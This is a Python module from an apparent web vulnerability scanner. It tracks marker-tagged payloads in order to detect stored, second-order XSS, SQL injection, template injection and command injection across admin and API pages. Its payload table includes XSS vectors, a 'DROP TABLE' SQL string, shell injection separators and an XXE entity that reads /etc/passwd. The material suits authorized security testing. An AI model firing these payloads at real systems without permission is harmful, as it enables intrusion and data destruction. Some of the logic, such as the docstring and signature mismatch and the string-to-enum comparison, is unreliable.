"""
Second-Order Tracker - Cross-Endpoint Input Flow Tracking

Tracks inputs submitted during scans to detect second-order vulnerabilities:
- Second-Order XSS: Input at /profile renders at /admin/users
- Second-Order SQLi: Input at /register executes at /admin/report
- Stored CSRF: Token at /settings triggers at /admin/action
- Delayed Execution: Input stored now, executed later

Architecture:
- Centralized tracker (singleton) shared across all scanners
- Records all inputs with unique markers
- Provides APIs for checking render locations
- Supports multiple vulnerability types

Usage:
    tracker = SecondOrderTracker.get_instance()

    # Record input submission
    marker = tracker.record_input(
        endpoint="/api/profile",
        field="bio",
        payload="<script>/*MARKER_abc123*/</script>",
        vuln_type="xss",
    )

    # Later, check if marker appears in other locations
    locations = await tracker.check_render_locations(
        base_url="https://example.com",
        client=client,
        rate_limiter=rate_limiter,
    )

Author: PHANTOM AI
Version: 1.0.0
"""

from __future__ import annotations

import asyncio
import random
import re
import string
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import TYPE_CHECKING, Any
from urllib.parse import urljoin, urlparse

import httpx

from utils.logger import get_logger
from utils.scan_client import get_scan_client

if TYPE_CHECKING:
    from utils.rate_limiter import RateLimiter

logger = get_logger(__name__)


class VulnType(Enum):
    """Types of second-order vulnerabilities to track."""
    XSS = "xss"
    SQLI = "sqli"
    SSTI = "ssti"
    COMMAND_INJECTION = "cmdi"
    LDAP_INJECTION = "ldap"
    XPATH_INJECTION = "xpath"
    XXE = "xxe"
    SSRF = "ssrf"
    GENERIC = "generic"


class ExecutionContext(Enum):
    """Context where payload might execute."""
    HTML_BODY = auto()
    HTML_ATTRIBUTE = auto()
    JAVASCRIPT = auto()
    JSON_RESPONSE = auto()
    XML_RESPONSE = auto()
    SQL_QUERY = auto()
    TEMPLATE = auto()
    COMMAND_LINE = auto()
    LOG_FILE = auto()
    EMAIL = auto()
    PDF_EXPORT = auto()
    CSV_EXPORT = auto()


@dataclass
class TrackedInput:
    """
    Represents an input submitted during scanning.

    Contains all information needed to:
    1. Identify the input later (marker)
    2. Trace back to original submission
    3. Determine vulnerability type if found
    """
    marker: str                          # Unique identifier in payload
    endpoint: str                        # Where submitted
    method: str                          # HTTP method used
    field_name: str                      # Field/parameter name
    payload: str                         # Full payload with marker
    vuln_type: VulnType                  # Type of vulnerability
    timestamp: float                     # When submitted
    response_status: int = 0             # Response from submission
    response_contains_marker: bool = False  # If marker reflected immediately
    auth_headers: dict = field(default_factory=dict)  # Auth used
    metadata: dict = field(default_factory=dict)  # Extra context

    def to_dict(self) -> dict:
        return {
            "marker": self.marker,
            "endpoint": self.endpoint,
            "method": self.method,
            "field_name": self.field_name,
            "vuln_type": self.vuln_type.value,
            "timestamp": self.timestamp,
            "response_status": self.response_status,
        }


@dataclass
class SecondOrderFinding:
    """
    Represents a confirmed second-order vulnerability.
    """
    tracked_input: TrackedInput
    render_location: str                 # Where payload was found
    render_context: ExecutionContext     # Context (HTML, JS, etc.)
    is_executable: bool                  # Can it execute?
    confidence: float                    # 0-100
    evidence: list[str] = field(default_factory=list)
    response_snippet: str = ""


# =============================================================================
# RENDER LOCATION PATTERNS
# =============================================================================

# High-priority locations where stored data often renders
RENDER_LOCATIONS = {
    # Admin/Staff panels (highest priority - often render raw)
    "admin": [
        "/admin/users",
        "/admin/customers",
        "/admin/members",
        "/admin/accounts",
        "/admin/logs",
        "/admin/activity",
        "/admin/audit",
        "/admin/reports",
        "/admin/dashboard",
        "/admin/orders",
        "/admin/transactions",
        "/admin/feedback",
        "/admin/comments",
        "/admin/support",
        "/admin/tickets",
        "/staff/users",
        "/staff/tickets",
        "/staff/orders",
        "/manage/users",
        "/management/users",
        "/backoffice/users",
        "/internal/users",
        "/internal/logs",
    ],
    # API endpoints returning stored data
    "api": [
        "/api/users",
        "/api/v1/users",
        "/api/v2/users",
        "/api/customers",
        "/api/members",
        "/api/profiles",
        "/api/accounts",
        "/api/activity",
        "/api/logs",
        "/api/audit",
        "/api/comments",
        "/api/reviews",
        "/api/feedback",
        "/api/messages",
        "/api/notifications",
        "/api/orders",
        "/api/transactions",
        "/api/reports",
    ],
    # Reports/Exports (different rendering context)
    "export": [
        "/reports",
        "/reports/users",
        "/reports/activity",
        "/reports/export",
        "/export/users",
        "/export/csv",
        "/export/pdf",
        "/export/excel",
        "/download/report",
        "/generate/report",
        "/print",
        "/print/order",
    ],
    # User listings and profiles
    "listings": [
        "/users",
        "/members",
        "/customers",
        "/profiles",
        "/directory",
        "/people",
        "/team",
        "/leaderboard",
        "/rankings",
    ],
    # Activity/Audit logs
    "logs": [
        "/activity",
        "/logs",
        "/audit",
        "/history",
        "/timeline",
        "/events",
        "/changelog",
    ],
    # Notifications/Messages
    "messaging": [
        "/notifications",
        "/messages",
        "/inbox",
        "/alerts",
        "/announcements",
    ],
    # Comments/Reviews/Feedback
    "ugc": [
        "/comments",
        "/reviews",
        "/feedback",
        "/testimonials",
        "/ratings",
    ],
    # Search results
    "search": [
        "/search",
        "/search/users",
        "/search/results",
        "/find",
        "/query",
    ],
    # Dashboard widgets
    "dashboard": [
        "/dashboard",
        "/home",
        "/overview",
        "/summary",
        "/stats",
    ],
    # GraphQL (can expose stored data)
    "graphql": [
        "/graphql",
        "/api/graphql",
        "/gql",
    ],
}


# =============================================================================
# PAYLOAD TEMPLATES BY VULNERABILITY TYPE
# =============================================================================

PAYLOAD_TEMPLATES = {
    VulnType.XSS: [
        '<script>/*{marker}*/alert(1)</script>',
        '<img src=x onerror="/*{marker}*/alert(1)">',
        '<svg onload="/*{marker}*/alert(1)">',
        '"><script>/*{marker}*/</script><"',
        "'-/*{marker}*/-'",
        '" onfocus="/*{marker}*/alert(1)" autofocus="',
    ],
    VulnType.SQLI: [
        "'; SELECT/*{marker}*/ 1; --",
        "' OR '1'='1'/*{marker}*/--",
        "1; WAITFOR/*{marker}*/ DELAY '0:0:1'--",
        "'; DROP/*{marker}*/ TABLE test; --",
    ],
    VulnType.SSTI: [
        "{{/*{marker}*/7*7}}",
        "${/*{marker}*/7*7}",
        "<%= /*{marker}*/7*7 %>",
        "{#/*{marker}*/comment#}",
    ],
    VulnType.COMMAND_INJECTION: [
        "; echo {marker}; #",
        "| echo {marker} |",
        "` echo {marker} `",
        "$( echo {marker} )",
    ],
    VulnType.XXE: [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;<!--{marker}--></foo>',
    ],
    VulnType.GENERIC: [
        "{marker}",
        "<!--{marker}-->",
        "/* {marker} */",
        "# {marker}",
    ],
}


class SecondOrderTracker:
    """
    Singleton tracker for second-order vulnerability detection.

    Shared across all scanner modules to:
    1. Record inputs submitted during scan
    2. Check render locations for markers
    3. Report second-order findings
    """

    _instance: "SecondOrderTracker | None" = None

    def __init__(self):
        self._tracked_inputs: list[TrackedInput] = []
        self._markers_sent: set[str] = set()
        self._findings: list[SecondOrderFinding] = []
        self._render_cache: dict[str, str] = {}  # url -> response body
        self._checked_locations: set[str] = set()

    @classmethod
    def get_instance(cls) -> "SecondOrderTracker":
        """Get singleton instance."""
        if cls._instance is None:
            cls._instance = cls()
        return cls._instance

    @classmethod
    def reset(cls) -> None:
        """Reset tracker for new scan."""
        cls._instance = None

    def generate_marker(self, vuln_type: VulnType = VulnType.GENERIC) -> str:
        """Generate unique marker for tracking."""
        random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"SECONDORDER_{vuln_type.value}_{random_part}"

    def get_payload(self, vuln_type: VulnType, marker: str | None = None) -> tuple[str, str]:
        """
        Get payload with embedded marker for vulnerability type.

        Returns:
            (payload, marker)
        """
        if marker is None:
            marker = self.generate_marker(vuln_type)

        templates = PAYLOAD_TEMPLATES.get(vuln_type, PAYLOAD_TEMPLATES[VulnType.GENERIC])
        template = random.choice(templates)
        payload = template.format(marker=marker)

        return payload, marker

    def record_input(
        self,
        endpoint: str,
        field_name: str,
        payload: str,
        marker: str,
        vuln_type: VulnType,
        method: str = "POST",
        response_status: int = 0,
        response_contains_marker: bool = False,
        auth_headers: dict | None = None,
        metadata: dict | None = None,
    ) -> TrackedInput:
        """
        Record an input submission for later checking.

        Args:
            endpoint: URL where input was submitted
            field_name: Parameter/field name
            payload: Full payload with marker
            marker: The unique marker in payload
            vuln_type: Type of vulnerability
            method: HTTP method used
            response_status: Response status code
            response_contains_marker: If marker appeared in response (reflected)
            auth_headers: Authentication headers used
            metadata: Additional context

        Returns:
            TrackedInput object
        """
        tracked = TrackedInput(
            marker=marker,
            endpoint=endpoint,
            method=method,
            field_name=field_name,
            payload=payload,
            vuln_type=vuln_type,
            timestamp=time.time(),
            response_status=response_status,
            response_contains_marker=response_contains_marker,
            auth_headers=auth_headers or {},
            metadata=metadata or {},
        )

        self._tracked_inputs.append(tracked)
        self._markers_sent.add(marker)

        logger.debug(
            f"[SecondOrderTracker] Recorded input: {marker} at {endpoint}/{field_name}"
        )

        return tracked

    async def check_render_locations(
        self,
        base_url: str,
        rate_limiter: "RateLimiter",
        auth_headers: dict | None = None,
        location_categories: list[str] | None = None,
        additional_locations: list[str] | None = None,
        timeout: float = 10.0,
    ) -> list[SecondOrderFinding]:
        """
        Check render locations for tracked markers.

        Args:
            base_url: Base URL of target
            rate_limiter: Rate limiter
            auth_headers: Authentication headers
            location_categories: Categories to check (admin, api, export, etc.)
            additional_locations: Extra URLs to check
            timeout: Request timeout

        Returns:
            List of SecondOrderFinding for confirmed vulnerabilities
        """
        if not self._tracked_inputs:
            logger.debug("[SecondOrderTracker] No tracked inputs to check")
            return []

        findings = []

        # Build list of locations to check
        locations = []

        categories = location_categories or list(RENDER_LOCATIONS.keys())
        for category in categories:
            locations.extend(RENDER_LOCATIONS.get(category, []))

        if additional_locations:
            locations.extend(additional_locations)

        # Remove duplicates while preserving order
        locations = list(dict.fromkeys(locations))

        logger.info(
            f"[SecondOrderTracker] Checking {len(locations)} render locations "
            f"for {len(self._tracked_inputs)} tracked inputs"
        )

        async with get_scan_client(timeout=timeout, follow_redirects=True) as client:
            for location in locations[:50]:  # Limit to 50 locations
                if location in self._checked_locations:
                    continue

                url = urljoin(base_url, location)

                try:
                    await rate_limiter.acquire()

                    headers = auth_headers or {}
                    response = await client.get(url, headers=headers, timeout=timeout)

                    if response.status_code == 200:
                        body = response.text
                        self._render_cache[url] = body
                        self._checked_locations.add(location)

                        # Check for any of our markers
                        for tracked in self._tracked_inputs:
                            if tracked.marker in body:
                                # Found marker - analyze context
                                finding = self._analyze_render_context(
                                    tracked, url, body
                                )
                                if finding:
                                    findings.append(finding)
                                    self._findings.append(finding)

                                    logger.info(
                                        f"[SecondOrderTracker] FOUND: {tracked.marker} "
                                        f"from {tracked.endpoint} renders at {url}"
                                    )

                except asyncio.TimeoutError:
                    logger.debug(f"[SecondOrderTracker] Timeout checking {url}")
                except Exception as e:
                    logger.debug(f"[SecondOrderTracker] Error checking {url}: {e}")

        logger.info(
            f"[SecondOrderTracker] Found {len(findings)} second-order vulnerabilities"
        )

        return findings

    def _analyze_render_context(
        self,
        tracked: TrackedInput,
        render_url: str,
        response_body: str,
    ) -> SecondOrderFinding | None:
        """
        Analyze the context where marker renders.

        Returns SecondOrderFinding if vulnerability is confirmed.
        """
        marker = tracked.marker
        pos = response_body.find(marker)

        if pos == -1:
            return None

        # Get surrounding context
        start = max(0, pos - 200)
        end = min(len(response_body), pos + len(marker) + 200)
        context = response_body[start:end]

        # Determine execution context
        render_context = self._detect_context(context, marker)

        # Check if executable based on vuln type and context
        is_executable = self._is_executable(tracked.vuln_type, render_context, context, marker)

        # Calculate confidence
        confidence = self._calculate_confidence(
            tracked, render_context, is_executable, context
        )

        if confidence < 50:
            return None

        evidence = [
            f"Payload submitted to: {tracked.endpoint}",
            f"Field: {tracked.field_name}",
            f"Marker found at: {render_url}",
            f"Render context: {render_context.name}",
            f"Executable: {is_executable}",
            f"Time between submission and render: {time.time() - tracked.timestamp:.1f}s",
        ]

        return SecondOrderFinding(
            tracked_input=tracked,
            render_location=render_url,
            render_context=render_context,
            is_executable=is_executable,
            confidence=confidence,
            evidence=evidence,
            response_snippet=context[:500],
        )

    def _detect_context(self, context: str, marker: str) -> ExecutionContext:
        """Detect the execution context where marker appears."""
        context_lower = context.lower()
        marker_pos = context.find(marker)
        before = context[:marker_pos].lower() if marker_pos > 0 else ""

        # Check for JavaScript context
        if '<script' in before and '</script>' not in before:
            return ExecutionContext.JAVASCRIPT

        # Check for HTML attribute
        if re.search(r'=\s*["\'][^"\']*$', before):
            return ExecutionContext.HTML_ATTRIBUTE

        # Check for JSON
        if '{' in context and '}' in context and '"' in context:
            try:
                import json
                json.loads(context)
                return ExecutionContext.JSON_RESPONSE
            except:
                pass

        # Check for XML
        if '<?xml' in context_lower or '</' in context:
            return ExecutionContext.XML_RESPONSE

        # Check for template
        if '{{' in context or '${' in context or '<%' in context:
            return ExecutionContext.TEMPLATE

        # Default to HTML body
        return ExecutionContext.HTML_BODY

    def _is_executable(
        self,
        vuln_type: VulnType,
        render_context: ExecutionContext,
        context: str,
        marker: str,
    ) -> bool:
        """Check if payload can execute in this context."""

        if vuln_type == VulnType.XSS:
            # Check if XSS payload is in executable position
            xss_indicators = ['<script', 'onerror=', 'onload=', 'onfocus=', 'onclick=']
            for indicator in xss_indicators:
                if indicator in context.lower():
                    # Check if not HTML-encoded
                    import html
                    encoded = html.escape(indicator)
                    if encoded not in context:
                        return True
            return False

        elif vuln_type == VulnType.SQLI:
            # For SQLi, if marker appears in response, injection likely worked
            return True

        elif vuln_type == VulnType.SSTI:
            # Check if template was evaluated
            if '49' in context:  # 7*7
                return True
            return False

        elif vuln_type == VulnType.COMMAND_INJECTION:
            # Check if command output appears
            return marker in context

        return True  # Default to true for unknown types

    def _calculate_confidence(
        self,
        tracked: TrackedInput,
        render_context: ExecutionContext,
        is_executable: bool,
        context: str,
    ) -> float:
        """Calculate confidence score for finding."""
        confidence = 50.0

        # Boost for executable context
        if is_executable:
            confidence += 25.0

        # Boost for different endpoint (true second-order)
        if tracked.endpoint.rstrip('/') != render_context:
            confidence += 10.0

        # Boost for admin/privileged location
        if any(kw in context.lower() for kw in ['admin', 'staff', 'internal']):
            confidence += 5.0

        # Reduce if marker was already reflected (might be first-order)
        if tracked.response_contains_marker:
            confidence -= 15.0

        # Boost based on vuln type severity
        if tracked.vuln_type in (VulnType.XSS, VulnType.SQLI, VulnType.COMMAND_INJECTION):
            confidence += 5.0

        return min(100, max(0, confidence))

    def get_tracked_inputs(self) -> list[TrackedInput]:
        """Get all tracked inputs."""
        return self._tracked_inputs.copy()

    def get_findings(self) -> list[SecondOrderFinding]:
        """Get all confirmed second-order findings."""
        return self._findings.copy()

    def get_stats(self) -> dict:
        """Get tracking statistics."""
        return {
            "inputs_tracked": len(self._tracked_inputs),
            "markers_sent": len(self._markers_sent),
            "locations_checked": len(self._checked_locations),
            "findings_confirmed": len(self._findings),
            "vuln_types": {
                vt.value: sum(1 for t in self._tracked_inputs if t.vuln_type == vt)
                for vt in VulnType
            },
        }
